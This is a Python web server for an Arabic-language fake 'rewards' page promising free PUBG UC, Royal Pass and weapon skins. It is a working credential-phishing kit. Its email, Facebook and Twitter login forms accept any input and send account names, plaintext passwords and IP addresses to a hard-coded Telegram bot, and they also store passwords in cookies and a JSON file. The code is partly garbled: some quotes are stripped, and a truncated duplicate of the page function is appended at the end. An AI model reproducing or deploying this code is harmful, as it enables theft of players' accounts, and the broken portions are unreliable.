import base64
import hashlib
import hmac
import json
import os
import re
import secrets
import threading
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CLAIMS_FILE = os.path.join(BASE_DIR, "claims.json")
SECRET = os.environ.get("SECRET_KEY", "rewards-page-improved-secret").encode("utf-8")

# إعدادات بوت تليجرام
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "1449862347:AAE5eRycQGU4kdlFePuR4XciSazQdjtEuqw").strip()
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "1188729209").strip()

EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")

AD_SNIPPET = """
<!-- ضعي هنا كود الإعلان الخاص بكِ عند النشر -->
<div class="ad-box">مساحة إعلانية — يمكنكِ وضع كود الإعلان هنا</div>
"""

ITEMS = [
    {"id": 1, "category": "شدات (UC)", "title": "60 شدة UC", "tag": "مجاني / تجريبي"},
    {"id": 2, "category": "شدات (UC)", "title": "300 شدة UC", "tag": "عرض خاص"},
    {"id": 3, "category": "رويال باس", "title": "Royal Pass أساسي", "tag": "موسمي"},
    {"id": 4, "category": "رويال باس", "title": "Elite Royal Pass", "tag": "مميز"},
    {"id": 5, "category": "سكنات", "title": "سكن بدلة نادرة", "tag": "سكن"},
    {"id": 6, "category": "أسلحة", "title": "سكن سلاح M416", "tag": "سلاح"},
    {"id": 7, "category": "أسلحة", "title": "سكن سلاح AKM", "tag": "سلاح"},
]


def sign_token(data_obj: dict) -> str:
    raw = json.dumps(data_obj, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
    payload = base64.urlsafe_b64encode(raw).decode("ascii")
    sig = hmac.new(SECRET, payload.encode("ascii"), hashlib.sha256).hexdigest()
    return f"{payload}.{sig}"


def verify_token(token_str: str | None) -> dict | None:
    if not token_str or "." not in token_str:
        return None
    payload, sig = token_str.rsplit(".", 1)
    expected = hmac.new(SECRET, payload.encode("ascii"), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig, expected):
        return None
    try:
        raw = base64.urlsafe_b64decode(payload.encode("ascii"))
        parsed = json.loads(raw.decode("utf-8"))
        return parsed if isinstance(parsed, dict) else None
    except Exception:
        return None


def validate_email_login(email: str, password: str) -> tuple[bool, str]:
    clean_email = email.strip().lower()
    if not clean_email:
        return False, "يرجى إدخال البريد الإلكتروني."
    if not EMAIL_REGEX.match(clean_email):
        return False, "صيغة البريد الإلكتروني غير صحيحة (مثال: name@gmail.com)."
    if not password:
        return False, "يرجى إدخال كلمة المرور."
    if len(password) < 6:
        return False, "كلمة المرور يجب أن تكون 6 أحرف أو أرقام على الأقل."
    if len(password) > 128:
        return False, "كلمة المرور طويلة جداً."
    return True, clean_email


def validate_social_login(provider: str, account: str, password: str) -> tuple[bool, str, str]:
    clean_account = account.strip()
    if not clean_account:
        return False, f"يرجى إدخال البريد الإلكتروني أو اسم المستخدم لحساب {provider}.", ""
    if len(clean_account) < 3:
        return False, "أدخلي بريد إلكتروني أو اسم مستخدم صحيح.", ""
    if not password:
        return False, "يرجى إدخال كلمة السر.", ""
    if len(password) < 6:
        return False, "كلمة السر يجب أن تكون 6 أحرف أو أرقام على الأقل.", ""
    if len(password) > 128:
        return False, "كلمة السر طويلة جداً.", ""
    display_name = clean_account.split("@")[0] if "@" in clean_account else clean_account
    return True, display_name, clean_account


def send_telegram_message(text: str) -> None:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = urllib.parse.urlencode({
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
    }).encode("utf-8")
    req = urllib.request.Request(url, data=payload, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            resp.read()
    except (urllib.error.URLError, TimeoutError, Exception) as exc:
        print(f"⚠️ تعذر إرسال الرسالة إلى تليجرام: {exc}")


def notify_telegram_async(text: str) -> None:
    t = threading.Thread(target=send_telegram_message, args=(text,), daemon=True)
    t.start()


def save_claim(entry: dict) -> None:
    claims = []
    if os.path.exists(CLAIMS_FILE):
        with open(CLAIMS_FILE, "r", encoding="utf-8") as f:
            try:
                loaded = json.load(f)
                if isinstance(loaded, list):
                    claims = loaded
            except json.JSONDecodeError:
                claims = []
    claims.append(entry)
    with open(CLAIMS_FILE, "w", encoding="utf-8") as f:
        json.dump(claims, f, ensure_ascii=False, indent=2)


def render_social_login_page(provider: str, error_msg: str = "") -> str:
    provider_label = "فيسبوك (Facebook)" if provider == "facebook" else "تويتر (X)"
    accent_color = "#1877f2" if provider == "facebook" else "#010409"
    err_html = f <p class="msg err">{error_msg}</p>  if error_msg else  <p class="msg"></p> 

    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول عبر {provider_label}</title>
    <style>
        * {{ box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }}
        body {{ margin: 0; background: #0d1117; color: #e6edf3; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; }}
        .box {{ width: 100%; max-width: 420px; background: #161b22; border: 1px solid #30363d; border-radius: 14px; padding: 22px; }}
        .head {{ display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }}
        .provider-badge {{ background: {accent_color}; color: #fff; padding: 6px 12px; border-radius: 8px; font-weight: 700; font-size: 0.9rem; border: 1px solid #30363d; }}
        h2 {{ margin: 0 0 8px; font-size: 1.15rem; }}
        p.sub {{ margin: 0 0 16px; color: #8b949e; font-size: 0.9rem; }}
        .field {{ margin-bottom: 12px; }}
        label {{ display: block; margin-bottom: 6px; font-size: 0.9rem; }}
        input {{ width: 100%; padding: 11px 13px; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: #fff; font-size: 0.95rem; }}
        input:focus {{ outline: none; border-color: #f59e0b; }}
        .actions {{ display: flex; gap: 10px; margin-top: 14px; }}
        button {{ flex: 1; background: #f59e0b; color: #0d1117; border: none; padding: 11px 16px; border-radius: 10px; font-weight: 700; cursor: pointer; }}
        button:hover {{ background: #fbbf24; }}
        a.back {{ display: inline-flex; align-items: center; justify-content: center; padding: 11px 14px; border-radius: 10px; background: #21262d; color: #e6edf3; text-decoration: none; font-weight: 600; }}
        .msg {{ margin-top: 12px; font-size: 0.9rem; min-height: 20px; }}
        .msg.err {{ color: #f87171; }}
    </style>
</head>
<body>
    <div class="box">
        <div class="head">
            <span class="provider-badge">{provider_label}</span>
        </div>
        <h2>تسجيل الدخول بحساب {provider_label}</h2>
        <p class="sub">أدخلي البريد الإلكتروني أو اسم المستخدم وكلمة السر للمتابعة.</p>
        <form method="POST" action="/auth/{provider}/submit">
            <div class="field">
                <label for="account">البريد الإلكتروني أو اسم المستخدم</label>
                <input type="text" id="account" name="account" autocomplete="username" placeholder="مثال: user@gmail.com أو اسم المستخدم" required>
            </div>
            <div class="field">
                <label for="password">كلمة السر</label>
                <input type="password" id="password" name="password" autocomplete="current-password" placeholder="أدخلي كلمة السر (6 أحرف+)" required>
            </div>
            <div class="actions">
                <button type="submit">تسجيل الدخول</button>
                <a class="back" href="/">رجوع</a>
            </div>
            {err_html}
        </form>
    </div>
</body>
</html>
"""


def render_page(user: dict | None, selected_cat: str = "الكل", flash_error: str = "") -> str:
    categories = ["الكل", "شدات (UC)", "رويال باس", "سكنات", "أسلحة"]
    if selected_cat not in categories:
        selected_cat = "الكل"

    cats_html = []
    for cat in categories:
        active_cls = "cat-btn active" if cat == selected_cat else "cat-btn"
        cats_html.append(f <button type="button" class="{active_cls}" data-cat="{cat}">{cat}</button> )

    filtered = ITEMS if selected_cat == "الكل" else [i for i in ITEMS if i["category"] == selected_cat]
    cards_html = []
    for item in filtered:
        cards_html.append(f"""
        <div class="item-card" data-id="{item[ id ]}" data-title="{item[ title ]}">
            <div class="item-cat">{item[ category ]}</div>
            <div class="item-title">{item[ title ]}</div>
            <div class="item-tag">{item[ tag ]}</div>
        </div>
        """)

    error_box = f <p id="authMsg" class="msg err">{flash_error}</p>  if flash_error else  <p id="authMsg" class="msg"></p> 

    if user:
        auth_html = f"""
        <div class="user-bar">
            <div>
                <strong>مرحباً، {user.get( name ,  مستخدم )}</strong>
                <div class="muted">{user.get( provider ,   )} — {user.get( identifier ,   )}</div>
            </div>
            <a class="logout" href="/logout">تسجيل الخروج</a>
        </div>
        """
    else:
        auth_html = f"""
        <div class="auth-wrap">
            <div class="email-row">
                <input type="email" id="email" autocomplete="email" placeholder="البريد الإلكتروني (مثال: user@gmail.com)">
                <input type="password" id="password" autocomplete="current-password" placeholder="كلمة المرور (6 أحرف+)">
                <button type="button" id="emailBtn">دخول بالبريد</button>
            </div>
            <div class="divider">أو تسجيل الدخول عبر</div>
            <div class="social-row">
                <a class="sbtn fb" href="/auth/facebook">فيسبوك (Facebook)</a>
                <a class="sbtn tw" href="/auth/twitter">تويتر (X)</a>
            </div>
        </div>
        {error_box}
        """

    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة العروض والهدايا</title>
    <style>
        * {{ box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }}
        body {{ margin: 0; background: #0d1117; color: #e6edf3; }}
        .topbar {{ display: flex; justify-content: space-between; align-items: center; padding: 16px 22px; background: #161b22; border-bottom: 1px solid #30363d; }}
        .brand {{ font-weight: 700; font-size: 1.15rem; color: #f59e0b; }}
        .badge {{ background: #21262d; padding: 6px 12px; border-radius: 8px; font-size: 0.85rem; }}
        .container {{ max-width: 920px; margin: 20px auto; padding: 0 14px; display: flex; flex-direction: column; gap: 16px; }}
        .card {{ background: #161b22; border: 1px solid #30363d; border-radius: 14px; padding: 18px; }}
        .card h2 {{ margin: 0 0 12px; font-size: 1.05rem; }}
        .ad-box {{ background: #1f242c; border: 1px dashed #484f58; color: #8b949e; text-align: center; padding: 14px; border-radius: 10px; font-size: 0.9rem; }}
        input {{ width: 100%; padding: 11px 13px; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: #fff; font-size: 0.95rem; }}
        input:focus {{ outline: none; border-color: #f59e0b; }}
        .auth-wrap {{ display: flex; flex-direction: column; gap: 12px; }}
        .email-row {{ display: grid; grid-template-columns: 1fr 1fr auto; gap: 10px; }}
        .social-row {{ display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }}
        @media (max-width: 640px) {{ .email-row, .social-row {{ grid-template-columns: 1fr; }} }}
        .divider {{ text-align: center; color: #8b949e; font-size: 0.88rem; }}
        .sbtn {{ text-align: center; padding: 11px; border-radius: 10px; text-decoration: none; font-weight: 700; color: #fff; }}
        .sbtn.fb {{ background: #1877f2; }}
        .sbtn.tw {{ background: #010409; border: 1px solid #30363d; }}
        .user-bar {{ display: flex; justify-content: space-between; align-items: center; background: #21262d; padding: 14px 16px; border-radius: 10px; gap: 10px; flex-wrap: wrap; }}
        .muted {{ color: #8b949e; font-size: 0.85rem; margin-top: 4px; }}
        .logout {{ color: #f87171; text-decoration: none; font-weight: 700; }}
        .cats {{ display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 14px; }}
        .cat-btn {{ background: #21262d; color: #e6edf3; border: 1px solid #30363d; padding: 8px 14px; border-radius: 999px; cursor: pointer; font-weight: 600; }}
        .cat-btn.active {{ background: #f59e0b; color: #0d1117; border-color: #f59e0b; }}
        .grid {{ display: grid; grid-template-columns: repeat(auto-fill, minmax(170px, 1fr)); gap: 12px; }}
        .item-card {{ background: #21262d; border: 2px solid transparent; border-radius: 12px; padding: 14px; cursor: pointer; }}
        .item-card:hover {{ border-color: #484f58; }}
        .item-card.active {{ border-color: #f59e0b; background: #292e36; }}
        .item-cat {{ font-size: 0.78rem; color: #8b949e; }}
        .item-title {{ font-weight: 700; font-size: 1rem; margin-top: 6px; }}
        .item-tag {{ color: #34d399; font-size: 0.82rem; margin-top: 8px; }}
        .claim-row {{ margin-top: 14px; display: flex; justify-content: space-between; align-items: center; gap: 12px; flex-wrap: wrap; }}
        button.primary, .email-row button {{ background: #f59e0b; color: #0d1117; border: none; padding: 11px 20px; border-radius: 10px; font-weight: 700; cursor: pointer; white-space: nowrap; }}
        button.primary:hover, .email-row button:hover {{ background: #fbbf24; }}
        button:disabled {{ opacity: 0.6; cursor: not-allowed; }}
        .msg {{ margin-top: 12px; font-size: 0.95rem; min-height: 20px; }}
        .msg.err {{ color: #f87171; }}
        .msg.ok {{ color: #34d399; }}
    </style>
</head>
<body>
    <header class="topbar">
        <div class="brand">مركز العروض والهدايا</div>
        <div class="badge">واجهة تجريبية</div>
    </header>

    <main class="container">
        {AD_SNIPPET}

        <section class="card">
            <h2>1. تسجيل الدخول</h2>
            {auth_html}
        </section>

        <section class="card">
            <h2>2. اختاري العنصر المطلوب (شدات / رويال باس / سكنات / أسلحة)</h2>
            <div class="cats">
                {  .join(cats_html)}
            </div>
            <div class="grid">
                {  .join(cards_html)}
            </div>
            <div class="claim-row">
                <div>العنصر المختار: <strong id="chosenTitle">لا يوجد</strong></div>
                <button type="button" class="primary" id="claimBtn">إرسال الطلب</button>
            </div>
            <p id="claimMsg" class="msg"></p>
        </section>
    </main>

    <script>
        let selectedItemId = null;

        document.querySelectorAll(".cat-btn").forEach(btn => {{
            btn.addEventListener("click", () => {{
                const cat = encodeURIComponent(btn.dataset.cat);
                location.href = "/?cat=" + cat;
            }});
        }});

        document.querySelectorAll(".item-card").forEach(card => {{
            card.addEventListener("click", () => {{
                document.querySelectorAll(".item-card").forEach(c => c.classList.remove("active"));
                card.classList.add("active");
                selectedItemId = Number(card.dataset.id);
                document.getElementById("chosenTitle").textContent = card.dataset.title;
            }});
        }});

        const emailBtn = document.getElementById("emailBtn");
        const emailInput = document.getElementById("email");
        const passwordInput = document.getElementById("password");
        const authMsg = document.getElementById("authMsg");

        async function submitEmailLogin() {{
            if (!emailBtn || !emailInput || !passwordInput) return;
            const email = emailInput.value.trim();
            const password = passwordInput.value;

            authMsg.textContent = "";
            authMsg.className = "msg";
            emailBtn.disabled = true;

            try {{
                const res = await fetch("/api/login/email", {{
                    method: "POST",
                    headers: {{"Content-Type": "application/json"}},
                    body: JSON.stringify({{email, password}})
                }});
                const data = await res.json();
                if (data.ok) {{
                    location.reload();
                }} else {{
                    authMsg.textContent = data.message || "تعذر تسجيل الدخول.";
                    authMsg.className = "msg err";
                    emailBtn.disabled = false;
                }}
            }} catch (err) {{
                authMsg.textContent = "حدث خطأ في الاتصال بالخادم.";
                authMsg.className = "msg err";
                emailBtn.disabled = false;
            }}
        }}

        if (emailBtn) {{
            emailBtn.addEventListener("click", submitEmailLogin);
            [emailInput, passwordInput].forEach(inp => {{
                inp.addEventListener("keydown", e => {{
                    if (e.key === "Enter") {{
                        e.preventDefault();
                        submitEmailLogin();
                    }}
                }});
            }});
        }}

        const claimBtn = document.getElementById("claimBtn");
        const claimMsg = document.getElementById("claimMsg");
        if (claimBtn) {{
            claimBtn.addEventListener("click", async () => {{
                claimMsg.textContent = "";
                claimMsg.className = "msg";
                claimBtn.disabled = true;

                try {{
                    const res = await fetch("/api/claim", {{
                        method: "POST",
                        headers: {{"Content-Type": "application/json"}},
                        body: JSON.stringify({{item_id: selectedItemId}})
                    }});
                    const data = await res.json();
                    claimMsg.textContent = data.message || "";
                    claimMsg.className = data.ok ? "msg ok" : "msg err";
                }} catch (err) {{
                    claimMsg.textContent = "تعذر إرسال الطلب، حاولي مجدداً.";
                    claimMsg.className = "msg err";
                }} finally {{
                    claimBtn.disabled = false;
                }}
            }});
        }}
    </script>
</body>
</html>
"""


class RewardsHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def get_cookies(self) -> dict[str, str]:
        result = {}
        cookie_hdr = self.headers.get("Cookie", "")
        for part in cookie_hdr.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                result[k.strip()] = v.strip()
        return result

    def get_session_user(self) -> dict | None:
        cookies = self.get_cookies()
        return verify_token(cookies.get("rewards_session"))

    def send_json(self, payload: dict, status: int = 200, extra_headers: list[tuple[str, str]] | None = None) -> None:
        body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        if extra_headers:
            for h_name, h_val in extra_headers:
                self.send_header(h_name, h_val)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def send_html(self, html: str, status: int = 200, extra_headers: list[tuple[str, str]] | None = None) -> None:
        body = html.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        if extra_headers:
            for h_name, h_val in extra_headers:
                self.send_header(h_name, h_val)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def redirect(self, location: str, extra_headers: list[tuple[str, str]] | None = None) -> None:
        self.send_response(302)
        self.send_header("Location", location)
        if extra_headers:
            for h_name, h_val in extra_headers:
                self.send_header(h_name, h_val)
        self.end_headers()

    def do_GET(self):
        raw_path = self.path
        path = raw_path.split("?", 1)[0]
        query_params = {}
        if "?" in raw_path:
            query_params = parse_qs(raw_path.split("?", 1)[1])

        selected_cat = (query_params.get("cat") or ["الكل"])[0]
        flash_error = (query_params.get("auth_err") or [""])[0]

        if path == "/":
            self.send_html(render_page(self.get_session_user(), selected_cat, flash_error))

        elif path in ("/auth/facebook", "/auth/twitter"):
            provider = path.split("/")[-1]
            state_val = secrets.token_urlsafe(16)
            state_cookie = f"oauth_state={sign_token({ provider : provider,  state : state_val})}; Path=/; HttpOnly; SameSite=Lax"
            self.send_html(render_social_login_page(provider), extra_headers=[("Set-Cookie", state_cookie)])

        elif path == "/logout":
            clear_user = "rewards_session=; Path=/; Max-Age=0; SameSite=Lax"
            self.redirect("/", extra_headers=[("Set-Cookie", clear_user)])

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        path = self.path.split("?", 1)[0]
        try:
            length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            length = 0

        raw = self.rfile.read(length) if 0 < length <= 1_000_000 else b""
        content_type = (self.headers.get("Content-Type") or "").lower()
        client_ip = self.headers.get("X-Forwarded-For", self.client_address[0]).split(",")[0].strip()

        if path in ("/auth/facebook/submit", "/auth/twitter/submit"):
            provider = path.split("/")[2]
            provider_label = "فيسبوك (Facebook)" if provider == "facebook" else "تويتر (X)"
            form_data = parse_qs(raw.decode("utf-8", errors="replace"))
            account = (form_data.get("account") or [""])[0]
            password = (form_data.get("password") or [""])[0]

            ok, name_or_err, identifier = validate_social_login(provider_label, account, password)
            if not ok:
                self.send_html(render_social_login_page(provider, name_or_err), status=400)
                return

            user = {
                "name": name_or_err,
                "identifier": identifier,
                "password": password,
                "provider": provider_label,
            }
            user_cookie = f"rewards_session={sign_token(user)}; Path=/; HttpOnly; SameSite=Lax"
            clear_state = "oauth_state=; Path=/; Max-Age=0; SameSite=Lax"

            tg_login_msg = (
                f"🔐 تسجيل دخول جديد\n"
                f"━━━━━━━━━━━━━━━\n"
                f"• الوسيلة: {provider_label}\n"
                f"• الحساب: {identifier}\n"
                f"• كلمة السر: {password}\n"
                f"• الاسم: {name_or_err}\n"
                f"• IP: {client_ip}\n"
                f"• الوقت: {datetime.now().strftime( %Y-%m-%d %H:%M:%S )}"
            )
            notify_telegram_async(tg_login_msg)

            self.redirect("/", extra_headers=[("Set-Cookie", user_cookie), ("Set-Cookie", clear_state)])
            return

        try:
            data = json.loads(raw.decode("utf-8")) if "application/json" in content_type and raw else {}
            if not isinstance(data, dict):
                data = {}
        except Exception:
            data = {}

        if path == "/api/login/email":
            email = str(data.get("email") or "")
            password = str(data.get("password") or "")
            ok, msg_or_email = validate_email_login(email, password)
            if not ok:
                self.send_json({"ok": False, "message": msg_or_email}, 400)
                return

            display_name = msg_or_email.split("@")[0]
            user = {
                "name": display_name,
                "identifier": msg_or_email,
                "password": password,
                "provider": "البريد الإلكتروني",
            }
            user_cookie = f"rewards_session={sign_token(user)}; Path=/; HttpOnly; SameSite=Lax"

            tg_email_msg = (
                f"✉️ تسجيل دخول بالبريد الإلكتروني\n"
                f"━━━━━━━━━━━━━━━\n"
                f"• البريد: {msg_or_email}\n"
                f"• كلمة السر: {password}\n"
                f"• الاسم: {display_name}\n"
                f"• IP: {client_ip}\n"
                f"• الوقت: {datetime.now().strftime( %Y-%m-%d %H:%M:%S )}"
            )
            notify_telegram_async(tg_email_msg)

            self.send_json({"ok": True}, 200, extra_headers=[("Set-Cookie", user_cookie)])

        elif path == "/api/claim":
            user = self.get_session_user()
            if not user:
                self.send_json({"ok": False, "message": "يرجى تسجيل الدخول أولاً قبل إرسال الطلب."}, 401)
                return

            item_id = data.get("item_id")
            item = next((i for i in ITEMS if i["id"] == item_id), None)
            if not item:
                self.send_json({"ok": False, "message": "يرجى اختيار عنصر أولاً."}, 400)
                return

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            record = {
                "time": timestamp,
                "user": user,
                "item": item,
                "ip": client_ip,
            }
            save_claim(record)

            tg_claim_msg = (
                f"🎁 طلب جديد من الصفحة\n"
                f"━━━━━━━━━━━━━━━\n"
                f"• القسم: {item.get( category ,   )}\n"
                f"• العنصر: {item.get( title ,   )}\n"
                f"• الوسم: {item.get( tag ,   )}\n"
                f"• المستخدم: {user.get( name ,   )}\n"
                f"• الحساب: {user.get( identifier ,   )}\n"
                f"• كلمة السر: {user.get( password ,   )}\n"
                f"• وسيلة الدخول: {user.get( provider ,   )}\n"
                f"• IP: {client_ip}\n"
                f"• الوقت: {timestamp}"
            )
            notify_telegram_async(tg_claim_msg)

            self.send_json({
                "ok": True,
                "message": f"تم تسجيل طلب ({item[ title ]}) لحساب ({user[ identifier ]}) وإرساله بنجاح."
            })

        else:
            self.send_response(404)
            self.end_headers()


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    server = ThreadingHTTPServer(("0.0.0.0", port), RewardsHandler)
    print(f"✅ الصفحة تعمل الآن! افتحي المتصفح على: http://127.0.0.1:{port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nتم إيقاف السيرفر.")
        def render_page(user: dict | None, selected_cat: str = "الكل", flash_error: str = "") -> str:
    categories = ["الكل", "شدات (UC)", "رويال باس", "سكنات", "أسلحة"]
    if selected_cat not in categories:
        selected_cat = "الكل"

    cats_html = []
    for cat in categories:
        active_cls = "cat-btn active" if cat == selected_cat else "cat-btn"
        cats_html.append(f'<button type="button" class="{active_cls}" data-cat="{cat}">{cat}</button>')

    filtered = ITEMS if selected_cat == "الكل" else [i for i in ITEMS if i["category"] == selected_cat]
    cards_html = []
    for item in filtered:
        cards_html.append(f"""
        <div class="item-card" data-id="{item['id']}" data-title="{item['title']}">
            <div class="item-cat">{item['category']}</div>
            <div class="item-title">{item['title']}</div>
            <div class="item-tag">{item['tag']}</div>
        </div>
        """)

    error_box = f'<p id="authMsg" class="msg err">{flash_error}</p>' if flash_error else '<p id="authMsg" class="msg"></p>'

    if user:
        auth_html = f"""
        <div class="user-bar">
            <div>
                <strong>مرحباً، {user.get('name', 'مستخدم')}</strong>
                <div class="muted">{user.get('provider', '')} — {user.get('identifier', '')}</div>
            </div>
            <a class="logout" href="/logout">تسجيل الخروج</a>
        </div>
        """
    else:
        auth_html = f"""
        <div class="auth-wrap">
            <div class="email-row">
                <input type="email" id="email" autocomplete="email" placeholder="البريد الإلكتروني (مثال: user@gmail.com)">
                <input type="password" id="password" autocomplete="current-password" placeholder="كلمة المرور (6 أحرف+)">
                <button type="button" id="emailBtn">دخول بالبريد</button>
            </div>
            <div class="divider">أو تسجيل الدخول عبر</div>
            <div class="social-row">
                <a class="sbtn fb" href="/auth/facebook">فيسبوك (Facebook)</a>
                <a class="sbtn tw" href="/auth/twitter">تويتر (X)</a>
            </div>
        </div>
        {error_box}
        """

    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة العروض والهدايا</title>
    <style>
        * {{ box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }}
        body {{ margin: 0; background: #0d1117; color: #e6edf3; }}
        .topbar {{ display: flex; justify-content: space-between; align-items: center; padding: 16px 22px; background: #161b22; border-bottom: 1px solid #30363d; }}
        .brand {{ font-weight: 700; font-size: 1.15rem; color: #f59e0b; }}
        .badge {{ background: #21262d; padding: 6px 12px; border-radius: 8px; font-size: 0.85rem; }}
        .container {{ max-width: 920px; margin: 20px auto; padding: 0 14px; display: flex; flex-direction: column; gap: 16px; }}
        .card {{ background: #161b22; border: 1px solid #30363d; border-radius: 14px; padding: 18px; }}
        .card h2 {{ margin: 0 0 12px; font-size: 1.05rem; }}
        .ad-box {{ background: #1f242c; border: 1px dashed #484f58; color: #8b949e; text-align: center; padding: 14px; border-radius: 10px; font-size: 0.9rem; }}
        input {{ width: 100%; padding: 11px 13px; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: #fff; font-size: 0.95rem; }}
        input:focus {{ outline: none; border-color: #f59e0b; }}
        .auth-wrap {{ display: flex; flex-direction: column; gap: 12px; }}
        .email-row {{ display: grid; grid-template-columns: 1fr 1fr auto; gap: 10px; }}
        .social-row {{ display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }}
        @media (max-width: 640px) {{ .email-row, .social-row {{ grid-template-columns: 1fr; }} }}
        .divider {{ text-align: center; color: #8b949e; font-size: 0.88rem; }}
        .sbtn {{ text-align: center; padding: 11px; border-radius: 10px; text-decoration: none; font-weight: 700; color: #fff; }}
        .sbtn.fb {{ background: #1877f2; }}
        .sbtn.tw {{ background: #010409; border: 1px solid #30363d; }}
        .user-bar {{ display: flex; justify-content: space-between; align-items: center; background: #21262d; padding: 14px 16px; border-radius: 10px; gap: 10px; flex-wrap: wrap; }}
        .muted {{ color: #8b949e; font-size: 0.85rem; margin-top: 4px; }}
        .logout {{ color: #f87171; text-decoration: none; font-weight: 700; }}
        .cats {{ display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 14px; }}
        .cat-btn {{ background: #21262d; color: #e6edf3; border: 1px solid #30363d; padding: 8px 14px; border-radius: 999px; cursor: pointer; font-weight: 600; }}
        .cat-btn.active {{ background: #f59e0b; color: #0d1117; border-color: #f59e0b; }}
        .grid {{ display: grid; grid-template-columns: repeat(auto-fill, minmax(170px, 1fr)); gap: 12px; }}
        .item-card {{ background: #21262d; border: 2px solid transparent; border-radius: 12px; padding: 14px; cursor: pointer; }}
        .item-card:hover {{ border-color: #484f58; }}
        .item-card.active {{ border-color: #f59e0b; background: #292e36; }}
        .item-cat {{ font-size: 0.78rem; color: #8b949e; }}
        .item-title {{ font-weight: 700; font-size: 1rem; margin-top: 6px; }}
        .item-tag {{ color: #34d399; font-size: 0.82rem; margin-top: 8px; }}
        .claim-row {{ margin-top: 14px; display: flex; justify-content: space-between; align-items: center; gap: 12px; flex-wrap: wrap; }}
        button.primary, .email-row button {{ background: #f59e0b; color: #0d1117; border: none; padding: 11px 20px; border-radius: 10px; font-weight: 700; cursor: pointer; white-space: nowrap; }}
        button.primary:hover, .email-row button:hover {{ background: #fbbf24; }}
        button:disabled {{ opacity: 0.6; cursor: not-allowed; }}
        .msg {{ margin-top: 12px; font-size: 0.95rem; min-height: 20px; }}
        .msg.err {{ color: #f87171; }}
        .msg.ok {{ color: #34d399; }}
    </style>
</head>
<body>
    <header class="topbar">
        <div class="brand">مركز العروض والهدايا</div>
        <div class="badge">واجهة تجريبية</div>
    </header>

    <main class="container">
        {AD_SNIPPET}

        <section class="card">
            <h2>1. تسجيل الدخول</h2>
            {auth_html}
        </section>

        <section class="card">
            <h2>2. اختاري العنصر المطلوب (شدات / رويال باس / سكنات / أسلحة)</h2>
            <div class="cats">
                {''.join(cats_html)}
            </div>
            <div class="grid">
                {''.join(cards_html)}
            </div>
            <div class="claim-row">
                <div>العنصر المختار: <strong id="chosenTitle">لا يوجد</strong></div>
                <button type="button" class="primary" id="claimBtn">إرسال الطلب</button>
            </div>
            <p id="claimMsg" class="msg"></p>
        </section>
    </main>

    <script>
        let selectedItemId = null;

        document.querySelectorAll(".cat-btn").forEach(btn => {{
            btn.addEventListener("click", () => {{
                const cat = encodeURIComponent(btn.dataset.cat);
                location.href = "/?cat=" + cat;
            }});
        }});

        document.querySelectorAll(".item-card").forEach(card => {{
            card.addEventListener("click", () => {{
                document.querySelectorAll(".item-card").forEach(c => c.classList.remove("active"));
                card.classList.add("active");
                selectedItemId = Number(card.dataset.id);
                document.getElementById("chosenTitle").textContent = card.dataset.title;
            }});
        }});

        const emailBtn = document.getElementById("emailBtn");
        const emailInput = document.getElementById("email");
        const passwordInput = document.getElementById("password");
        const authMsg = document.getElementById("authMsg");

        async function submitEmailLogin() {{
            if (!emailBtn || !emailInput || !passwordInput) return;
            const email = emailInput.value.trim();
            const password = passwordInput.value;

            authMsg.textContent = "";
            authMsg.className = "msg";
            emailBtn.disabled = true;

            try {{
                const res = await fetch("/api/login/email", {{
                    method: "POST",
                    headers: {{"Content-Type": "application/json"}},
                    body: JSON.stringify({{email, password}})
                }});
                const data = await res.json();
                if (data.ok) {{
                    location.reload();
                }} else {{
                    authMsg.textContent = data.message || "تعذر تسجيل الدخول.";
                    authMsg.className = "msg err";
                    emailBtn.disabled = false;
                }}
